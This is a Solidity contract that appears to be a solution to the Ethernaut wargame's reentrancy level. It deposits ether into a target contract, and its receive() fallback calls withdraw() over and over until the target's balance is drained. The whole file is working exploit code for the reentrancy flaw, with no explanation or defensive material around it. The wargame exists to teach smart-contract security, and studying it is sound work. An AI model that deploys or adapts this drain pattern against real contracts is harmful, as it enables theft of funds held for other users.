// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 10: Re-entrancy
// https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D

contract Reentrance_Hack {
  address reentranceInstance;

  constructor(address _reentranceInstance) payable {
    reentranceInstance = _reentranceInstance;
  }

  function deposit() public payable {
    require(msg.value>0, 'Must send more than 0');
    IReentrance c = IReentrance(reentranceInstance);
    c.donate{value:msg.value}(address(this));
  }
  
  // Function called repeatedly withdrawing amount equal to the users deposit, until there is nothing left
  function drainContract() public {
    IReentrance c = IReentrance(reentranceInstance);
    uint contractBal = address(reentranceInstance).balance;
    if(contractBal > 0) {
      uint userBal = c.balanceOf(address(this));
      if(contractBal >= userBal) { 
        c.withdraw(userBal);
      } else {
        c.withdraw(contractBal);
      }
    }
  }

  receive() external payable {
    drainContract();
  }
}

interface IReentrance {
  function donate(address) external payable;
  function balanceOf(address) external view returns (uint);
  function withdraw(uint) external;
}